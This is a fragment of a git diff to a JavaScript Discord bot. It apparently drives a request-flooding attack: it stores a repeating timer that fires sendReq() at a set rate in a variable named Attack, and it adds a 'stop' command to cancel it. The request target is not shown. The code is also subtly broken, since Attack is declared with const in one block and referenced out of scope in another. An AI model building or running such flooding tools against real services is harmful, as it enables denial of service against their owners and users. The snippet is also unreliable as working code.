@@ -40,9 +40,12 @@ if (message.content.startsWith(prefix)) {
 					else{console.log('OK')}
 				}
 			)}
-		setInterval(sendReq, req_per_sec)
-		}
+		 const Attack = setInterval(() => sendReq(), req_per_sec)
 	}
+	if(command === 'stop') {
+		clearInterval(Attack)
+	}
+}
 })
 
 client.login(auth.token)
